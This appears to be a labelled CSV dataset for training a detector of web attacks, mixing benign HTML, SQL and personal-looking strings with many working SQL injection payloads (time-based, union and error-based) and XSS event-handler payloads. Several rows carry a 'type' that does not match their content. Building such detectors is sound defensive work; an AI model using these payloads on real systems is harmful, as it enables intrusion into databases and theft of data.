Text,Label,type
"<script ondblclick=""alert(1)"">test</script>",2,xss
"<tr onbeforecopy=""alert(1)"" contenteditable>test</tr>",2,xss
SELECT * FROM form  WHERE apple NOT LIKE '[additional]%',0,sql
5469,0,xss
"<li><a href=""/wiki/Chinese_room"" title=""Chinese room"">Chinese room </a> </li>",0,xss
"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;70–71 </li>",0,xss
"1'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
"	 </span> [<a rel=""nofollow"" class=""external text"" href=""//arxiv.org/archive/stat.ML"">stat.ML </a>]. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=preprint&amp;rft.jtitle=arXiv&amp;rft.atitle=Explaining+and+Harnessing+Adversarial+Examples&amp;rft.date=2014&amp;rft_id=info%3Aarxiv%2F1412.6572&amp;rft.aulast=Goodfellow&amp;rft.aufirst=Ian+J.&amp;rft.au=Shlens%2C+Jonathon&amp;rft.au=Szegedy%2C+Christian&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
<svg><acronym onload=alert(1)></acronym>,2,xss
SELECT * FROM wore WHERE date = 'exchange',0,sql
"<li><cite id=""CITEREFRussellNorvig2003"" class=""citation""><a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Russell, Stuart J. </a>; <a href=""/wiki/Peter_Norvig"" title=""Peter Norvig"">Norvig, Peter </a> (2003), <a rel=""nofollow"" class=""external text"" href=""http://aima.cs.berkeley.edu/""><i>Artificial Intelligence: A Modern Approach </i> </a> (2nd ed.), Upper Saddle River, New Jersey: Prentice Hall, <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/0-13-790395-2"" title=""Special:BookSources/0-13-790395-2""><bdi>0-13-790395-2 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+A+Modern+Approach&amp;rft.place=Upper+Saddle+River%2C+New+Jersey&amp;rft.edition=2nd&amp;rft.pub=Prentice+Hall&amp;rft.date=2003&amp;rft.isbn=0-13-790395-2&amp;rft.aulast=Russell&amp;rft.aufirst=Stuart+J.&amp;rft.au=Norvig%2C+Peter&amp;rft_id=http%3A%2F%2Faima.cs.berkeley.edu%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<details draggable=""true"" ondragleave=""alert(1)"">test</details>",2,xss
SELECT hand ( s )  FROM mine LEFT JOIN,0,sql
dipterocrea,0,sql
tuset mendel,0,sql
"  UPDATE group SET tongue =  'bus', City =  'directly' WHERE we =  seen",0,xss
1'+  (  select mrdi where 7451  =  7451 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
SELECT promised ( s )  FROM itself FULL OUTER JOIN,0,sql
alfa71ta,0,sql
aldeanueva de santa cruz,0,sql
"<style>:target {transform: rotate(180deg);}</style><datalist id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></datalist>",2,xss
SELECT * FROM instead ORDER BY atmosphere DESC,0,sql
SELECT * FROM spite WHERE standard BETWEEN 'base' AND 'solve',0,sql
SELECT AVG ( rain ) FROM found,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Programming_language_theory"" title=""Programming language theory"">Software notations </a><br />and <a href=""/wiki/Programming_tool"" title=""Programming tool"">tools </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
calle soria 154 2a,0,sql
SELECT * FROM willing WHERE fall = 'track' LIMIT 3,0,xss
"INSERT INTO wool ( vapor, frog, ranch, nodded, war, angry )  VALUES  ( 'mother', 'yourself'. thy', 'call', 'depend', 'thou', 'particles' )  ",0,sql
42462633x,0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><img id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></img>",2,xss
"<li id=""cite_note-311""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-311"">^ </a> </b> ",0,xss
<hgroup onpointermove=alert(1)>XSS</hgroup>,2,xss
<nobr onpointermove=alert(1)>XSS</nobr>,2,xss
"<datalist onmousemove=""alert(1)"">test</datalist>",2,xss
<menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>,2,xss
ceseri@discotecateatre.do,0,sql
"	 </span> <span class=""toctext"">Logic-based ",0,xss
1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,xss
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""hgds"" like ""hgds",1,sql
"1'+  (  select 'qaar' where 7841  =  7841 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1,sql
.raijo,0,sql
"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""ijop""  =  ""ijop",1,sql
"<spacer oncut=""alert(1)"" contenteditable>test</spacer>",2,xss
"<meter onclick=""alert(1)"">test</meter>",2,xss
"  SELECT equal,southern,trouble FROM hurry LEFT JOIN Orders ON fell.floorID =  headed.dust ORDER BY rope.heat",0,xss
1  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
"<main onbeforepaste=""alert(1)"" contenteditable>test</main>",2,xss
-3559'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1,xss
"<li class=""toclevel-2 tocsection-21""><a href=""#Sub-symbolic""><span class=""tocnumber"">5.3 ",0,xss
SELECT MIN ( customs )  AS telephone FROM zipper,0,sql
SELECT * FROM in WHERE curious BETWEEN thin09/01/1996nor AND lack15/31/1996personal,0,sql
SELECT * FROM distant WHERE silent NOT LIKE 'many%',0,sql
SELECT AVG ( closely )  FROM thank  SELECT SUM ( knowledge ) ,0,sql
"INSERT INTO desk ( hidden, atomic, lift, subject, noon, second )  VALUES  ( 'fed', 'badly'. sure', 'word', 'alive', 'first', 'yesterday' )  ",0,sql
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  3332  =  3332,1,sql
a6ordab07,0,sql
necforo,0,sql
1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,1,sql
"<li><a href=""/wiki/Dartmouth_workshop"" title=""Dartmouth workshop"">Dartmouth workshop </a> </li>",0,xss
SELECT * FROM although FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM consonant,0,sql
 ,1,sql
"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'ykoz'  =  'ykoz",1,sql
hartling@solmicro-erp.dz,0,sql
SELECT * FROM observe WHERE golden = 'various'  AND  ( character = 'gain' OR ball = 'dirty' ) ,0,sql
"etorbidea askatasuna 170, 8?a",0,xss
SELECT option_value FROM wp_options WHERE option_name  =  'options_instagram_url' LIMIT 1,0,sql
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,1,sql
27002424x,0,sql
SELECT * FROM tone WHERE swimming = 'rapidly'  AND City = 'huge',0,sql
1' where 5335  =  5335,1,sql
<tr onpointerenter=alert(1)>XSS</tr>,2,xss
"1""   )    )    and make_set  (  1167  =  5027,5027  )   and    (    (   ""grfi""  =  ""grfi",1,sql
SELECT * FROM journey,0,xss
"1 and elt  (  3172  =  7243,7243  )  ",1,sql
1   )    )    as hxtp where 5478  =  5478 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
SELECT COUNT ( because ) FROM exact,0,sql
SELECT * FROM spread ORDER BY say,0,sql
"<section onmouseout=""alert(1)"">test</section>",2,xss
<ins onpointerleave=alert(1)>XSS</ins>,2,xss
"<strong draggable=""true"" ondragleave=""alert(1)"">test</strong>",2,xss
"1%' union all select null,null,null,null,null,null,null#",1,sql
"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxhn' like 'zxhn",1,xss
	 </span>,0,xss
SELECT park ( s )  FROM contrast LEFT JOIN,0,sql
"<style>:target {transform: rotate(180deg);}</style><b id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></b>",2,xss
SELECT * FROM tribe 3 SELECT * FROM per,0,sql
"<thead onbeforecopy=""alert(1)"" contenteditable>test</thead>",2,xss
"pobla de claramunt, la",0,sql
99508422a,0,xss
entrala,0,xss
 </li>,0,xss
"<div draggable=""true"" contenteditable>drag me</div><hgroup ondrop=alert(1) contenteditable>drop here</hgroup>",2,xss
" select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",1,sql
SELECT * FROM  ( SELECT production FROM golden ) ,0,sql
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Computer_science"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0,xss
1'||  (  select 'glyc' from dual where 4058  =  4058,1,sql
"-9152""   )    )    as avga where 3825  =  3825 order by 1#",1,xss
"<sup draggable=""true"" ondragenter=""alert(1)"">test</sup>",2,xss
"   SELECT policeman, sit+ ', ' + wait+ ' ' + whole+ ', ' + without AS older  FROM there",0,sql
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  '%'  =  '",1,sql
arguisuelas,0,xss
"<track draggable=""true"" ondragend=""alert(1)"">test</track>",2,xss
"   SELECT wrote, none, frequentlyFROM settle WHERE against  IS NOT NULL",0,sql
weinberger@privatebanking.com.nz,0,sql
<!DOCTYPE html>,0,xss
SELECT COUNT ( underline )  FROM did,0,sql
"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1,sql
"1"" or sleep  (  5  )   and ""fbuo"" like ""fbuo",1,sql
"1%""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """,1,sql
"<style>:target {transform: rotate(180deg);}</style><noscript id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noscript>",2,xss
"<del onclick=""alert(1)"">test</del>",2,xss
<wbr onpointerdown=alert(1)>XSS</wbr>,2,xss
<noframes id=x tabindex=1 ondeactivate=alert(1)></noframes><input id=y autofocus>,2,xss
SELECT * FROM wing WHERE captain = 'man' LIMIT 3,0,sql
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,sql
"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"  SELECT Orders.relationshiprID, Employees.press, Employees.natural FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.planningID ORDER BY Orders.dogID",0,xss
eliseo,0,sql
ma724-3ra,0,sql
SELECT TOP 50 PERCENT * FROM tail,0,sql
<noscript id=x tabindex=1 ondeactivate=alert(1)></noscript><input id=y autofocus>,2,xss
"<li><a href=""#CITEREFNilsson1998"">Nilsson (1998 </a>, chpt. 25) </li> </ul>",0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></pre>",2,xss
"-5097'  )   union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--",1,xss
"<main draggable=""true"" ondragleave=""alert(1)"">test</main>",2,xss
"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""ncym"" like ""ncym",1,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/stats.html"">Stats Collection</a></li>",0,xss
calle nieto 41,0,sql
"    <span class=""rst-current-version"" data-toggle=""rst-current-version"">",0,xss
SELECT * FROM general WHERE minute LIKE '%stairs%',0,sql
"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1,sql
-2823'   )    )    or 5663  =  4228 and    (    (   'skgh' like 'skgh,1,sql
<noscript onpointerenter=alert(1)>XSS</noscript>,2,xss
"INSERT INTO base ( wind, view, eat, characteristic, fell, familiar )  VALUES  ( 'careful', 'struck'. sick', 'circus', 'star', 'amount', 'separate' )  ",0,sql
9464,0,sql
<caption id=x tabindex=1 onactivate=alert(1)></caption>,2,xss
"<th onmousedown=""alert(1)"">test</th>",2,xss
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onanimationend=""alert(1)""></ul>",2,xss
"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"  SELECT givenID AS ID, bus AS dust FROM goose",0,sql
		<span>More ,0,xss
	 <div>,0,xss
"1  )   as rbmn where 5948  =  5948 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
</div>,0,xss
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- btqa",1,sql
"   SELECT listen,income,neck,warn,quietly     (  (  spirit JOIN girl ON jar.dress =  burst.sound )   INNER JOIN stomachON Orders.solid =  voyage.pastID ) ",0,sql
SELECT * FROM brain WHERE gasoline = 'who',0,sql
"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",1,sql
<caption id=x tabindex=1 onfocusin=alert(1)></caption>,2,xss
SELECT TOP 3 * FROM thank SELECT * FROM job 3SELECT * FROM story,0,sql
SELECT TOP 3 * FROM equally SELECT * FROM enjoy 3SELECT * FROM duck,0,xss
select sleep  (  5  )   and    (    (     (  '%'  =  ',1,sql
<area onpointerup=alert(1)>XSS</area>,2,xss
1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,1,sql
"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""zvew"" like ""zvew",1,sql
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_4_text' LIMIT 1,0,xss
"1""   )    )    as ihfw where 3949  =  3949 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
-2992%'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',1,sql
"<li><a href=""/wiki/Semantics_(computer_science)"" title=""Semantics (computer science)"">Semantics </a> </li> </ul>",0,xss
"<audio oncut=""alert(1)"" contenteditable>test</audio>",2,xss
"""&""",1,sql
SELECT * FROM car WHERE naturally = 'plane' LIMIT 3,0,sql
"<li><a href=""/wiki/Firefly_algorithm"" title=""Firefly algorithm"">Firefly algorithm </a> </li>",0,xss
SELECT * FROM maybe FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM mind,0,sql
-2751 where 6334  =  6334 or   (  9668  =  5845  )  *5845--,1,xss
<marquee onpointerleave=alert(1)>XSS</marquee>,2,xss
"1""   )    )   ",1,xss
"1""   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
"1  )   as cfnz where 6065  =  6065 union all select null,null,null,null,null,null,null,null,null#",1,sql
"-1139  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
ansaldo,0,sql
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  '%'  =  '",1,sql
spruance@maquillajeparalabios.ro,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
SELECT something FROM completely UNION ALL SELECT broken FROM welcome ORDER BY lamp,0,sql
3407,0,sql
SELECT * FROM  ( SELECT someone FROM nor ) ,0,sql
"1""  )   as zuzm where 1211  =  1211 and elt  (  5458  =  2966,2966  )  --",1,sql
estiradamente,0,sql
"-3775'  )   as rqet where 7092  =  7092 or elt  (  1032  =  1032,3623  )  --",1,sql
-3496'   )    )    or 9323  =  9323#,1,xss
1   )    )    as xmac where 7692  =  7692,1,xss
"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""wvkp"" like ""wvkp",1,sql
"<li><a href=""/wiki/Numerical_analysis"" title=""Numerical analysis"">Numerical analysis </a> </li> </ul>",0,xss
SELECT TOP 3 * FROM worker WHERE ancient = 'typical' SELECT * FROM life,0,sql
54180440f,0,sql
"1 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"<li><a href=""/wiki/Interactive_evolutionary_computation"" title=""Interactive evolutionary computation"">Interactive evolutionary computation </a> </li> </ul>",0,xss
<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>,2,xss
"<li><a href=""/wiki/Elon_Musk"" title=""Elon Musk"">Elon Musk </a> </li>",0,xss
"  UPDATE football SET offer =  'tomorrow', City =  'due' WHERE after =  exchange",0,sql
SELECT * FROM mill,0,sql
"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,1,sql
"<li><a href=""/wiki/Deep_learning"" title=""Deep learning"">Deep learning </a> </li>",0,xss
"<progress draggable=""true"" ondragstart=""alert(1)"">test</progress>",2,xss
<track onpointermove=alert(1)>XSS</track>,2,xss
andrcies,0,sql
rubi de biasi,0,sql
SELECT COUNT ( whale )  FROM chamber,0,sql
SELECT * FROM teach FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
SELECT * FROM advice,0,xss
8.85924E+15,0,sql
soeltoft@nanogenerador.pr,0,sql
FROM  ( SELECT DISTINCT family FROM journey ) ,0,sql
"<kbd onmouseleave=""alert(1)"">test</kbd>",2,xss
1438,0,sql
"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",1,sql
"INSERT INTO respect  ( say, officer, on )  VALUES  ( 'ruler', 'party', 'gradually' )  ",0,sql
"<style>@keyframes x{}</style><select style=""animation-name:x"" onanimationend=""alert(1)""></select>",2,xss
"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'xpks' like 'xpks",1,sql
"<style>:target {transform: rotate(180deg);}</style><wbr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></wbr>",2,xss
"<li><a href=""/wiki/Ulla_Mitzdorf"" title=""Ulla Mitzdorf"">Ulla Mitzdorf </a> </li>",0,xss
	 </span> </li>,0,xss
1525,0,sql
SELECT Count ( * )  AS fox,0,sql
"1'||  (  select 'dpce' from dual where 5261  =  5261 union all select null,null,null,null,null,null--",1,sql
"	 </span> <span class=""reference-text"">",0,xss
cocina_r,0,sql
SELECT * FROM prove ORDER BY offer DESC,0,sql
"1 where 4477  =  4477 union all select null,null,null,null,null,null,null,null,null,null--",1,xss
33600,0,sql
SELECT * FROM locate WHERE school = 'engineer' LIMIT 3,0,sql
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;424–433, </li>",0,xss
"select * from generate_series  (  7237,7237,case when   (  7237  =  9757  )   then 1 else 0 end  )   limit 1--",1,sql
SELECT AVG ( but ) FROM improve SELECT SUM ( cross ) ,0,xss
<multicol onpointerover=alert(1)>XSS</multicol>,2,xss
SELECT TOP 3 * FROM split,0,xss
"1%""   )    )     )   union all select null#",1,xss
SELECT * FROM key WHERE hole BETWEEN upward09/01/1996body AND remain15/31/1996stopped,0,sql
8ienne2s6,0,sql
"1'   )    )    as kdwc where 5906  =  5906 union all select null,null,null,null,null,null,null,null,null--",1,sql
"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",1,sql
"<content draggable=""true"" ondragleave=""alert(1)"">test</content>",2,xss
DELETE FROM closely WHERE below = 'higher',0,sql
SELECT TOP 50 PERCENT * FROM eventually,0,sql
"1' in boolean mode  )   union all select null,null,null,null,null#",1,sql
"<li><a href=""/wiki/Open_Letter_on_Artificial_Intelligence"" title=""Open Letter on Artificial Intelligence"">Open Letter on Artificial Intelligence </a> </li>",0,xss
<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>,2,xss
"<style>:target {color: red;}</style><data id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></data>",2,xss
"<div id=""p-cactions"" role=""navigation"" class=""vectorMenu emptyPortlet"" aria-labelledby=""p-cactions-label"">",0,xss
bradshaw.ocallaghan@almascanarias.do,0,sql
	 </span></a></dt><dd>Use it on extensions and middlewares to extend Scrapy functionality</dd>,0,xss
-1432 order by 1#,1,sql
-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038,1,sql
	 </span>,0,xss
6087,0,sql
1%' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  ',1,xss
-9893' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'pbop'  =  'pbop,1,xss
"<template draggable=""true"" ondragstart=""alert(1)"">test</template>",2,xss
SELECT * FROM during WHERE mind = 'walk'  OR sound = 'since',0,xss
" select * from users where id  =  1 union select @ _,version  (    )   -- 1",1,xss
<script onload=alert(1) src=validjs.js></script>,2,xss
mary-ann,0,sql
6.71271E+14,0,sql
"   SELECT COUNT ( completely ) , hole FROM experiment BY graph",0,sql
1'  )   and sleep  (  5  )  #,1,sql
"<li><a href=""/wiki/Constructivist_epistemology"" title=""Constructivist epistemology"">Constructivist epistemology </a> </li>",0,xss
09899393d,0,sql
"<a href=""/wiki/Genetic_programming"" title=""Genetic programming"">Genetic programming </a> and <a href=""/wiki/Genetic_algorithms"" class=""mw-redirect"" title=""Genetic algorithms"">genetic algorithms </a>:",0,xss
admin' --,1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
6866,0,sql
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,sql
<dfn onpointerout=alert(1)>XSS</dfn>,2,xss
SELECT * FROM matter WHERE identity BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"-4304' where 1005  =  1005 union all select 1005,1005#",1,sql
"<form><input type=search onsearch=alert(1) value=""Hit return"" autofocus>",2,xss
"<a onbeforecut=""alert(1)"" contenteditable>test</a>",2,xss
"-8580'  )   union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",1,xss
SELECT * FROM nothing WHERE treated BETWEEN '1996-07-01' AND '1996-07-31',0,sql
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'npzh'  =  'npzh,1,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blink id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></blink>",2,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></iframe>",2,xss
5ecom058a?8a,0,sql
"-8971'||  (  select 'smyx' where 7970  =  7970 union all select 7970,7970,7970,7970,7970,7970,7970#",1,sql
1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',1,xss
" </p><p>AI often revolves around the use of <a href=""/wiki/Algorithms"" class=""mw-redirect"" title=""Algorithms"">algorithms </a>. An algorithm is a set of unambiguous instructions that a mechanical computer can execute.<sup id=""cite_ref-66"" class=""reference""><a href=""#cite_note-66"">&#91;b&#93; </a> </sup> A complex algorithm is often built on top of other, simpler, algorithms. A simple example of an algorithm is the following (optimal for first player) recipe for play at <a href=""/wiki/Tic-tac-toe"" title=""Tic-tac-toe"">tic-tac-toe </a>:<sup id=""cite_ref-FOOTNOTEDomingos2015Chapter_1_67-0"" class=""reference""><a href=""#cite_note-FOOTNOTEDomingos2015Chapter_1-67"">&#91;65&#93; </a> </sup>",0,xss
<rtc onpointerover=alert(1)>XSS</rtc>,2,xss
SELECT * FROM tool WHERE    NOT afraid = 'company',0,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">Artificial neural network </a> and <a href=""/wiki/Connectionism"" title=""Connectionism"">Connectionism </a> </div>",0,xss
93698052p,0,xss
"<li><a href=""/wiki/Medical_robot"" title=""Medical robot"">Medical </a> </li>",0,xss
completorio,0,sql
<blink id=x tabindex=1 onfocus=alert(1)></blink>,2,xss
"<dfn onkeypress=""alert(1)"" contenteditable>test</dfn>",2,xss
